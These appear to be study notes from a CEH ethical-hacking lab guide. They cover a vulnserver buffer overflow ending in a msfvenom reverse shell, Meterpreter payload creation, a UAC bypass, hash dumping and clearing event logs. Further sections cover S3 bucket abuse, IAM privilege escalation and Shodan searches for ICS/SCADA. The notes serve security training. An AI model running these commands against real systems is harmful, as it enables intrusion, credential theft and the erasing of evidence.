    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/euq3d0my.jpg)
    
51. The security pop-up appears; enter the **Windows 11** machine credentials (**Username**: **Admin** and **Password**: `Pa$$w0rd` and click `**Connect**`.
52. The **Windows shares on 10.10.1.11** window appears; double-click the **CEH-Tools** folder.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/g1dq4acl.jpg)
    
53. Navigate to **CEHv12 Module 06 System Hacking\Buffer Overflow Tools** and copy the **Scripts** folder. Close the window.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/by2jgftm.jpg)
    
54. Paste the **Scripts** folder on the **Desktop**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/vk2exaua.jpg)
    
55. Now, we will run a Python script to perform fuzzing. To do so, switch to the **terminal** window, type **cd /home/attacker/Desktop/Scripts/**, and press **Enter** to navigate to the **Scripts** folder on the **Desktop**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/x2sawbxe.jpg)
    
56. Type **chmod +x fuzz.py** and press **Enter** to change the mode to execute the Python script.
    
57. Now, type **./fuzz.py** and press **Enter** to run the Python fuzzing script against the target machine.
    
    > When you execute the Python script, buff multiplies for every iteration of a while loop and sends the buff data to the vulnerable server.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/35awqh0q.jpg)
    
58. Click [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) switch to the **Windows 11** machine and maximize the **Command Prompt** window running the vulnerable server.
    
59. You can observe the connection requests coming from the host machine (**10.10.1.13**).
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/1vhoka4w.jpg)
    
60. Now, switch to the **Immunity Debugger** window and wait for the status to change from **Running** to **Paused**.
    
61. In the top-right window, you can also observe that the EIP register is not overwritten by the Python script.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/qd5uafjq.jpg)
    
62. Click [Parrot Security](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) switch to the **Parrot Security** machine. In the **Terminal** window, press **Ctrl+C** to terminate the Python script.
    
63. A message appears, saying that the vulnerable server crashed after receiving approximately **11800** bytes of data, but it did not overwrite the EIP register.
    
    > The byte size might differ in your lab environment.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/xhkxigq2.jpg)
    
64. Click [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) switch back to the **Windows 11** machine and close **Immunity Debugger** and the vulnerable server process.
    
65. Re-launch both **Immunity Debugger** and the vulnerable server as an administrator. Now, **Attach** the **vulnserver** process to **Immunity Debugger** and click the **Run program** icon in the toolbar to run **Immunity Debugger**.
    
66. Through fuzzing, we have understood that we can overwrite the EIP register with 1 to 5100 bytes of data. Now, we will use the **pattern_create** Ruby tool to generate random bytes of data.
    
67. Click [Parrot Security](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch back to the **Parrot Security** machine.
    
68. Click the **MATE Terminal** icon at the top of the **Desktop** window to open a new **Terminal** window.
    
69. In the **Terminal** window, type **sudo su** and press **Enter** to run the programs as a root user.
    
70. In the **[sudo] password for attacker** field, type **toor** as a password and press **Enter**.
    
    > The password that you type will not be visible.
    
71. Now, type **cd** and press **Enter** to jump to the root directory.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/hxaucrxx.jpg)
    
72. Type **/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900** and press **Enter**.
    
    > **-l**: length, **11900**: byte size (here, we take the nearest even-number value of the byte size obtained in the previous step)
    
73. It will generate a random piece of bytes; right-click on it and click **Copy** to copy the code and close the **Terminal** window.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/q4c3lbxs.jpg)
    
74. Now, switch back to the previously opened terminal window, type **pluma findoff.py**, and press **Enter**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/reuqbjsa.jpg)
    
75. A Python script file appears; replace the code within inverted commas ("") in the **offset** variable with the copied code, as shown in the screenshot.
    
76. Press **Ctrl+S** to save the script file and close it.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/3rrpxp00.jpg)
    
77. In the **Terminal** window, type **chmod +x findoff.py** and press **Enter** to change the mode to execute the Python script.
    
78. Now, type **./findoff.py** and press **Enter** to run the Python script to send the generated random bytes to the vulnerable server.
    
    > When the above script is executed, it sends random bytes of data to the target vulnerable server, which causes a buffer overflow in the stack.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/tqwfk4ag.jpg)
    
79. Click [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) switch to the **Windows 11** machine.
    
80. In the **Immunity Debugger** window, you can observe that the EIP register is overwritten with random bytes.
    
81. Note down the random bytes in the EIP and find the offset of those bytes.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/gafrrlaw.jpg)
    
82. CLick [Parrot Security](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch to the **Parrot Security** machine.
    
83. Click the **MATE Terminal** icon at the top of the **Desktop** window to open a new **Terminal** window.
    
84. In the **Terminal** window, type **sudo su** and press **Enter** to run the programs as a root user.
    
85. In the **[sudo] password for attacker** field, type **toor** as a password and press **Enter**.
    
    > The password that you type will not be visible.
    
86. Now, type **cd** and press **Enter** to jump to the root directory.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/sg4a0met.jpg)
    
87. In the **Terminal** window, type **/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337** and press **Enter**.
    
    > **-l**: length, **11900**: byte size (here, we take the nearest even-number value of the byte size obtained in the **Step#81**), **-q**: offset value (here, **386F4337** identified in the previous step).
    
    > The byte length might differ in your lab environment.
    
88. A result appears, indicating that the identified EIP register is at an offset of **2003** bytes, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/2pjjjmem.jpg)
    
89. Close the **Terminal** window.
    
90. Click [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch back to the **Windows 11** machine and close **Immunity Debugger** and the vulnerable server process.
    
91. Re-launch both **Immunity Debugger** and the vulnerable server as an administrator. Now, **Attach** the **vulnserver** process to **Immunity Debugger** and click the **Run program** icon in the toolbar to run **Immunity Debugger**.
    
92. Now, we shall run the Python script to overwrite the EIP register.
    
93. Click [Parrot Security](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch back to the **Parrot Security** machine. In the **Terminal** window, type **chmod +x overwrite.py**, and press **Enter** to change the mode to execute the Python script.
    
94. Now, type **./overwrite.py** and press **Enter** to run the Python script to send the generated random bytes to the vulnerable server.
    
    > This Python script is used to check whether we can control the EIP register.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/z55v22ac.jpg)
    
95. Click [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch to the **Windows 11** machine. You can observe that the EIP register is overwritten, as shown in the screenshot.
    
    > The result indicates that the EIP register can be controlled and overwritten with malicious shellcode.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/f3uxp1zh.jpg)
    
96. Close **Immunity Debugger** and the vulnerable server process.
    
97. Re-launch both **Immunity Debugger** and the vulnerable server as an administrator. Now, **Attach** the **vulnserver** process to **Immunity Debugger** and click the **Run program** icon in the toolbar to run **Immunity Debugger**.
    
98. Now, before injecting the shellcode into the EIP register, first, we must identify bad characters that may cause issues in the shellcode
    
    > You can obtain the badchars through a Google search. Characters such as no byte, i.e., “\x00”, are badchars.
    
99. Click [Parrot Security](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch back to the **Parrot Security** machine. In the **Terminal** window, type **chmod +x badchars.py** and press **Enter** to change the mode to execute the Python script.
    
100. Now, type **./badchars.py** and press **Enter** to run the Python script to send the badchars along with the shellcode.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/taw4lo0o.jpg)
    
101. CLick [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch to the **Windows 11** machine.
    
102. In **Immunity Debugger**, click on the **ESP** register value in the top-right window. Right-click on the selected ESP register value and click the **Follow in Dump** option.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/u5ytvary.jpg)
    
103. In the left-corner window, you can observe that there are no badchars that cause problems in the shellcode, as shown in the screenshot.
    
    > The ESP value might when you perform this task.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/r302c0bv.jpg)
    
104. Close **Immunity Debugger** and the vulnerable server process.
    
105. Re-launch both **Immunity Debugger** and the vulnerable server as an administrator. Now, **Attach** the **vulnserver** process to **Immunity Debugger** and click the **Run program** icon in the toolbar to run **Immunity Debugger**.
    
106. Now, we need to identify the right module of the vulnerable server that is lacking memory protection. In **Immunity Debugger**, you can use scripts such as **mona.py** to identify modules that lack memory protection.
    
107. Now, navigate to **E:\CEH-Tools\CEHv12 Module 06 System Hacking\Buffer Overflow Tools\Scripts**, copy the **mona.py** script, and paste it in the location **C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands**.
    
    > If the **Destination Folder Access Denied** pop-up appears, click **Continue**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/1d0ibhxr.jpg)
    
108. Close the **File Explorer** window.
    
109. Switch to the **Immunity Debugger** window. In the text field present at bottom of the window, type **!mona modules** and press **Enter**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/5zwyyd4d.jpg)
    
110. The **Log data** pop-up window appears, which shows the protection settings of various modules.
    
111. You can observe that there is no memory protection for the module **essfunc.dll**, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/tioudmqc.jpg)
    
112. Now, we will exploit the essfunc.dll module to inject shellcode and take full control of the EIP register.
    
113. Click [Parrot Security](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch to the **Parrot Security** machine.
    
114. Click the **MATE Terminal** icon at the top of the **Desktop** window to open a new **Terminal** window.
    
115. A **Parrot Terminal** window appears. In the terminal window, type **sudo su** and press **Enter** to run the programs as a root user.
    
116. In the **[sudo] password for attacker** field, type **toor** as a password and press **Enter**.
    
    > The password that you type will not be visible.
    
117. Now, type **cd** and press **Enter** to jump to the root directory.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/0vxstaih.jpg)
    
118. In the **Terminal** window, type **/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb** and press **Enter**.
    
    > This script is used to convert assembly language into hex code.
    
119. The **nasm** command line appears; type **JMP ESP** and press **Enter**.
    
120. The result appears, displaying the hex code of **JMP ESP** (here, **FFE4**).
    
    > Note down this hex code value.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/oup0tqpl.jpg)
    
121. Type **EXIT** and press **Enter** to stop the script. Close the **Terminal** window.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/fyyut55p.jpg)
    
122. Click [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch back to the **Windows 11** machine.
    
123. In the **Immunity Debugger** window, type **!mona find -s “\xff\xe4” -m essfunc.dll** and press **Enter** in the text field present at the bottom of the window.
    
124. The result appears, displaying the return address of the vulnerable module, as shown in the screenshot.
    
    > Here, the return address of the vulnerable module is **0x625011af**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/ochiwubr.jpg)
    
125. Close **Immunity Debugger** and the vulnerable server process.
    
126. Re-launch both **Immunity Debugger** and the vulnerable server as an administrator. Now, **Attach** the **vulnserver** process to **Immunity Debugger**.
    
127. In the **Immunity Debugger** window, click the **Go to address in Disassembler icon**.
    
    ![disassembler.jpg](https://labondemand.blob.core.windows.net/content/lab117714/disassembler.jpg)
    
128. The **Enter expression to follow** pop-up appears; enter the identified return address in the text box (here, **625011af**) and click **OK**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/fc0zv1vq.jpg)
    
129. You will be pointed to **625011af ESP**; press **F2** to set up a breakpoint at the selected address, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/d22541ou.jpg)
    
130. Now, click on the **Run program** in the toolbar to run **Immunity Debugger**.
    
131. Click [Parrot Security](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch to the **Parrot Security** machine.
    
132. Maximize the **terminal** window, type **chmod +x jump.py**, and press **Enter** to change the mode to execute the Python script.
    
133. Now, type **./jump.py** and press **Enter** to execute the Python script.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/3g2nztsk.jpg)
    
134. Click [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch to the **Windows 11** machine.
    
135. In the **Immunity Debugger** window, you will observe that the EIP register has been overwritten with the return address of the vulnerable module, as shown in the screenshot.
    
    > You can control the EIP register if the target server has modules without proper memory protection settings.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/hoscdaiu.jpg)
    
136. Close **Immunity Debugger** and the vulnerable server process.
    
137. Re-launch the vulnerable server as an administrator.
    
138. Click [Parrot Security](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch to the **Parrot Security** machine.
    
139. Click the **MATE Terminal** icon at the top of the **Desktop** window to open a new **Terminal** window.
    
140. A **Parrot Terminal** window appears. In the terminal window, type **sudo su** and press **Enter** to run the programs as a root user.
    
141. In the **[sudo] password for attacker** field, type **toor** as a password and press **Enter**.
    
    > The password that you type will not be visible.
    
142. Now, type **cd** and press **Enter** to jump to the root directory.
    
143. In the terminal window enter the following command and press **Enter** to generate the shellcode.
    
    **msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b “\x00”**
    
    > Here, **-p**: payload, local IP address: **10.10.1.13**, listening port: **4444**., **-f**: filetype, **-a**: architecture, **-b**: bad character.
    
144. A shellcode is generated, as shown in the screenshot.
    
145. Select the code, right-click on it, and click **Copy** to copy the code.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/2kjzwspn.jpg)
    
146. Close the **Terminal** window.
    
147. Maximize the previously opened **Terminal** window. Type **pluma shellcode.py** and press **Enter**.
    
    > Ensure that the terminal navigates to **/root/Desktop/Scripts**.
    
148. A **shellcode.py** file appears in the text editor window, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/pw0r1r25.jpg)
    
149. Now, paste the shellcode copied in **Step#145** in the overflow option (**Line 4**); then, press **Ctrl+S** to save the file and close it.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/rr1el1a4.jpg)
    
150. Now, before running the above command, we will run the Netcat command to listen on port 4444. To do so, click the **MATE Terminal** icon at the top of the **Desktop** window to open a new **Terminal** window.
    
151. Open a new **Terminal** window. In the terminal window, type **sudo su** and press **Enter** to run the programs as a root user.
    
152. In the **[sudo] password for attacker** field, type **toor** as a password and press **Enter**.
    
    > The password that you type will not be visible.
    
153. Now, type **cd** and press **Enter** to jump to the root directory.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/4m3205qy.jpg)
    
154. Type **nc -nvlp 4444** and press **Enter**.
    
155. Netcat will start listening on port **4444**, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/zyxscb0o.jpg)
    
156. Switch back to the first **Terminal** window. Type **chmod +x shellcode.py** and press **Enter** to change the mode to execute the Python script.
    
157. Type **./shellcode.py** and press **Enter** to execute the Python script.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/ry2ec3iw.jpg)
    
158. Now, switch back to the **Terminal** running the Netcat command.
    
159. You can observe that shell access to the target vulnerable server has been established, as shown in the screenshot.
    
160. Now, type **whoami** and press **Enter** to display the username of the current user.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/ua53jmky.jpg)
    
161. This concludes the demonstration of performing a buffer overflow attack to gain access to a remote system.
    
162. Close all the open windows and document all the acquired information.
    
163. Restart **Parrot Security** machine. To do that click **Menu** button at the bottom left of the **Desktop**, from the menu and click **Turn off the device** icon. A **Shut down this system now?** pop-up appears, click on **Restart** button.
    
164. Click [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch to the **Windows 11** machine. Restart the machine.



### Perform Privilege Escalation to Gain Higher Privilges
Privilege escalation is the process of gaining more privileges than were initially acquired. Here, you can take advantage of design flaws, programming errors, bugs, and configuration oversights in the OS and software application to gain administrative access to the network and its associated applications.

Backdoors are malicious files that contain trojan or other infectious applications that can either halt the current working state of a target machine or even gain partial or complete control over it. Here, you need to build such backdoors to gain remote access to the target system. You can send these backdoors through email, file-sharing web applications, and shared network drives, among other methods, and entice the users to execute them. Once a user executes such an application, you can gain access to their affected machine and perform activities such as keylogging and sensitive data extraction.

##### Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities
Privilege escalation tools such as BeRoot and GhostPack Seatbelt allow you to run a configuration assessment on a target system to find information about the underlying vulnerabilities of system resources such as services, file and directory permissions, kernel version, and architecture. Using this information, you can find a way to further exploit and elevate the privileges on the target system.

Exploiting client-side vulnerabilities allows you to execute a command or binary on a target machine to gain higher privileges or bypass security mechanisms. Using these exploits, you can further gain access to privileged user accounts and credentials.

This task demonstrates the exploitation procedure on a weakly patched Windows 11 machine that allows you to gain access through a Meterpreter shell, and then employing privilege escalation techniques to attain administrative privileges to the machine through the Meterpreter shell.

1. `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe` : To create a Reverse TCP Shell Virus

2. Send this Virus to the Target Computer and then start the Listener. To start the listener use the command, `msfconsole` and then `use exploit/multi/handler`. 
3. Then `set payload windows/meterpreter.reverse_tcp` and `set LHOST 10.10.1.13`. Then to run the listener in the background, we can use the command : `exploit -j -z`.
4. When the Target System runs the application, we can check that our Attacking System using the command : `sessions -i 1`
5. Now that you have gained access to the target system with normal user privileges, your next task is to perform privilege escalation to attain higher-level privileges in the target system.
6. First, we will use privilege escalation tools (BeRoot), which allow you to run a configuration assessment on a target system to find out information about its underlying vulnerabilities, services, file and directory permissions, kernel version, architecture, as well as other data. Using this information, you can find a way to further exploit and elevate the privileges on the target system.
7. Now, we will copy the BeRoot tool on the host machine (Parrot Security), and then upload the tool onto the target machine (Windows 11) using the Meterpreter session.
8. Now, switch back to the **Terminal** window with an active **meterpreter** session. Type **upload /home/attacker/Desktop/BeRoot/beRoot.exe** and press **Enter**. This command uploads the **beRoot.exe** file to the target system’s present working directory (here, **Downloads**).
9. Type **shell** and press **Enter** to open a shell session. Observe that the present working directory points to the **Downloads** folder in the target system.
	![[Pasted image 20241211163224.png]]
10. Upload Seatbelt.exe.
11. Type **Seatbelt.exe -group=system** and press **Enter** to gather information about AMSIProviders, AntiVirus, AppLocker etc.
12. Type **Seatbelt.exe -group=user** and press **Enter** to gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc.
13. Type **Seatbelt.exe -group=misc** and press **Enter** to gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc.
14. ![[Pasted image 20241211163713.png]]
15. Another method for performing privilege escalation is to bypass the user account control setting (security configuration) using an exploit, and then to escalate the privileges using the Named Pipe Impersonation technique.
16. Now, let us check our current system privileges by executing the `run post/windows/gather/smart_hashdump` command.
17. The command fails to dump the hashes from the SAM file located on the Windows 11 machine and returns an error stating Insufficient privileges to dump hashes!.
18. From this, it is evident that the Meterpreter session requires admin privileges to perform such actions. 
19. Now, we shall try to escalate the privileges by issuing a getsystem command that attempts to elevate the user privileges.
20. The command issued is: `getsystem -t 1`: Uses the service – Named Pipe Impersonation (In Memory/Admin) Technique. The command fails to escalate privileges and returns an error stating Operation failed.
21. Type in the command : `background`
22. Now, we will use the **bypassuac_fodhelper** exploit for windows. To do so, type **use exploit/windows/local/bypassuac_fodhelper** and press **Enter**.
23. Type set SESSION 1 (1 is the current Meterpreter session which is running in the background)
24. Now that we have configured the exploit, our next step will be to set and configure a payload. To do so, type set payload windows/meterpreter/reverse_tcp and press Enter. This will set the meterpreter/reverse_tcp payload. Do check all the options before exploiting using the command `show options`
25. To set the TARGET option, type set TARGET 0 and press Enter (here, 0 indicates nothing, but the Exploit Target ID).
	![[Pasted image 20241211164236.png]]
26. Now, check the output of the command `getuid`, we get the result as `Windows11\Admin`
27. Now, to elevate the privileges, we again are required to type in the command : `getsystem -t 1`
28. Type the command run post/windows/gather/smart_hashdump and press Enter. This time, Meterpreter successfully extracts the NTLM hashes and displays them.
29. You can now remotely execute commands such as clearev to clear the event logs that require administrative or root privileges. To do so, type clearev and press Enter.
	![[Pasted image 20241211164545.png]]

 ##### Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter
 The Metasploit Framework is a tool for developing and executing exploit code against a remote target machine. It is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code. It contains a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. Meterpreter is a Metasploit attack payload that provides an interactive shell that can be used to explore the target machine and execute code.



# Cloud Computing
Cloud computing refers to on-demand delivery of IT capabilities, in which IT infrastructure and applications are provided to subscribers as metered services over a network. Cloud services are classified into three categories, namely infrastructure-as-a-service (IaaS), platform-as-a-service (PaaS), and software-as-a-service (SaaS), which offer different techniques for developing cloud.

**S3 Buckets** : An S3 bucket is a container for storing objects in Amazon Web Services (AWS) Simple Storage Service (S3). Buckets are similar to file folders and are used to organize and manage data in the cloud.
### Perform S3 Bucket Enumeration using Various S3 Bucket Enumeration Tools
Enumeration tools are used to collect detailed information about target systems to exploit them. Information collected by S3 enumeration tools consists of a list of misconfigured S3 buckets that are available publicly. Attackers can exploit these buckets to gain unauthorized access to them. Moreover, they can modify, delete, and exfiltrate the bucket content.

##### Enumerate S3 Buckets using lazys3
lazys3 is a Ruby script tool that is used to brute-force AWS S3 buckets using different permutations. This tool obtains the publicly accessible S3 buckets and also allows you to search the S3 buckets of a specific company by entering the company name.

To run the script, we need to use the command : `ruby lazys3.rb <Company_Name>`

##### Enumerate S3 Buckets using S3 Scanner
S3Scanner is a tool that finds the open S3 buckets and dumps their contents. It takes a list of bucket names to check as its input. The S3 buckets that are found are output to a file. The tool also dumps or lists the contents of “open” buckets locally.

To run the S3Scanner, we first are required to fulfill Python Requirements using the command : `pip3 install  -r requirements.txt`
`python3 ./s3scanner.py sites.txt` : Command used to run the scanner.

S3Inspector (https://github.com), s3-buckets-bruteforcer (https://github.com), Mass3 (https://github.com), Bucket Finder (https://digi.ninja), and s3recon (https://github.com) to perform S3 bucket enumeration for a target website or company.


### Exploit S3 Buckets
S3 buckets are used by customers and end users to store text documents, PDFs, videos, images, etc. To store all these data, the user needs to create a bucket with a unique name.

Listed below are several techniques that can be adopted to identify AWS S3 Buckets:

- **Inspecting HTML**: Analyze the source code of HTML web pages in the background to find URLs to the target S3 buckets
- **Brute-Forcing URL**: Use Burp Suite to perform a brute-force attack on the target bucket’s URL to identify its correct URL
- **Finding subdomains**: Use tools such as Findsubdomains and Robtex to identify subdomains related to the target bucket
- **Reverse IP Search**: Use search engines such as Bing to perform reverse IP search to identify the domains of the target S3 buckets
- **Advanced Google hacking**: Use advanced Google search operators such as **“inurl”** to search for URLs related to the target S3 buckets


###### Exploit Open S3 Buckets using AWS CLI
`pip3 install awscli` : To install AWS CLI
`aws --help` : To check whether AWS CLI is properly installed or not.
`aws configure` : To configure AWS CLI
Create new Access Key ID from the `console.aws.amazon.com`
Put the Access Key ID on the Configure CLI.
`aws s3 ls s3://[BucketName]` : To list all the directories in the given Bucket Name
`echo "You have been hacked" >> Hack.txt`  : To create a file with the String
`aws s3 mv Hack.txt s3://[BuceketName]` : This will move the file `Hack.txt` to the Bucket.
`aws s3 rm s3://[BuceketName]/Hack.txt` : This will remove the file `Hack.txt` from the Bucket.
Now, if we need to see the bucket on our Browser, we can go to the website : `[BucketName].s3.amazonaws.com`

### Perform Privilege Escalation to Gain Higher Privileges
Privileges are security roles assigned to users for using specific programs, features, OSes, functions, files, code, etc. to limit access depending on the type of user. Privilege escalation is required when you want to access system resources that you are not authorized to access. It takes place in two forms: vertical and horizontal.

- **Horizontal Privilege Escalation**: An unauthorized user tries to access the resources, functions, and other privileges of an authorized user who has similar access permissions
- **Vertical Privilege Escalation**: An unauthorized user tries to access the resources and functions of a user with higher privileges such as application or site administrators

##### Escalate IAM User Privileges by  Exploiting User Policy
A policy is an entity that, when attached to an identity or resource, defines its permissions. You can use the AWS Management Console, AWS CLI, or AWS API to create customer-managed policies in IAM. Customer-managed policies are standalone policies that you administer in your AWS account. You can then attach the policies to the identities (users, groups, and roles) in your AWS account. If the user policies are not configured properly, they can be exploited by attackers to gain full administrator access to the target user’s AWS account.

Create a file named `user-policy.json` 
```
{
	"Version":"2012-10-17",
	"Statement": [
		{
		    "Effect":"Allow",
		    "Action":"*",
		    "Resource":"*"
		}
	]
}
```

`aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json` : This command will attach the created policy to the Target IAM User's Account

`aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy` : This command will attack the created policy to the Target IAM User Account

`aws iam list-attached-user-policies --user-name [Target Username]` : Prints the list attached policy names.

`awm iam list users` : To list all the IAM Users in the AWS Environment.

Similarly, you can use various commands to obtain complete information about the AWS environment such as the list of S3 buckets, user policies, role policies, and group policies, as well as to create a new user.

List of S3 buckets: `aws s3api list-buckets --query "Buckets[].Name"`

User Policies: `aws iam list-user-policies`

Role Policies: `aws iam list-role-policies`

Group policies: `aws iam list-group-policies`

Create user: `aws iam create-user`


# Iot & OT Hacking
The objective of a hacker in exploiting IoT devices is to gain unauthorized access to users’ devices and data. A hacker can use compromised IoT devices to build an army of botnets, which, in turn, is used to launch DDoS attacks.

### Perform Footprinting using Various Footprinting Techniques
Footprinting techniques are used to collect basic information about the target IoT and OT platforms to exploit them. Information collected through footprinting techniques includes IP address, hostname, ISP, device location, banner of the target IoT device, FCC ID information, certification granted to the device, etc.

##### Gather Information using Online Footprinting Tools
`https://www.whois.com/whois/` 
`https://www.exploit-db.com/google-hacking-database`
` https://www.google.com`
`https://account.shodan.io/login`   
    Similarly, you can gather additional information on a target device using the following Shodan filters:
    - **Search for Modbus-enabled ICS/SCADA systems:**  `port:502`
    - **Search for SCADA systems using PLC name:**  `“Schneider Electric"`
    - **Search for SCADA systems using geolocation:**       ` SCADA Country:"US"`

### Capture and Analyze IoT Device Traffic
Many IoT devices such as security cameras host websites for controlling or configuring cameras from remote locations. These websites mostly implement the insecure HTTP protocol instead of the secure HTTPS protocol and are, hence, vulnerable to various attacks. If the cameras use the default factory credentials, an attacker can easily intercept all the traffic flowing between the camera and web applications and further gain access to the camera itself. Attackers can use tools such as Wireshark to intercept such traffic and decrypt the Wi-Fi keys of the target network.

##### Capture and Analyze IoT Traffic using Wireshark
MQTT is a lightweight messaging protocol that uses a publish/subscribe communication pattern. Since the protocol is meant for devices with a low-bandwidth, it is considered ideal for machine-to-machine (M2M) communication or IoT applications. We can create virtual IoT devices over the virtual network using the Bevywise IoT simulator on the client side and communicate these devices to the server using the MQTT Broker web interface. This interface collects data and displays the status and messages of connected devices over the network.

`Bevywise_IoTSimulator_Win_64.exe` : It is used to create IoT Devices
`Bevywise_MQTTRoute_Win_64` : It is used to establish MQTT Route
# Hacking Wireless Networks
A wireless local area network (WLAN) is an unbounded data communication system, based on the IEEE 802.11 standard, which uses radio frequency technology to communicate with devices and obtain data. This network frees the user from complicated and multiple wired connections. With the need for a physical connection or cable removed, individuals are able to use networks in new ways, and data has become ever more portable and accessible.

In wireless networks, communication takes place through radio wave transmission, which usually takes place at the physical layer of the network structure. Thanks to the wireless communication revolution, fundamental changes to data networking and telecommunication are taking place. This means that you will need to know and understand several types of wireless networks. These include:

- **Extension to a wired network**: A wired network is extended by the introduction of access points between the wired network and wireless devices
- **Multiple access points**: Multiple access points connect computers wirelessly
- **LAN-to-LAN wireless network**: All hardware APs have the ability to interconnect with other hardware access points
- **3G/4G hotspot**: A mobile device shares its cellular data wirelessly with Wi-Fi-enabled devices such as MP3 players, notebooks, tablets, cameras, PDAs, and netbooks.

### Perform Wireless Traffic Analysis
This wireless traffic analysis will help you to determine the weaknesses and vulnerable devices in the target network. In the process, you will determine the network’s broadcasted SSID, the presence of multiple access points, the possibility of recovering SSIDs, the authentication method used, WLAN encryption algorithms, etc.

##### Wi-Fi Packet Analysis using Wireshark
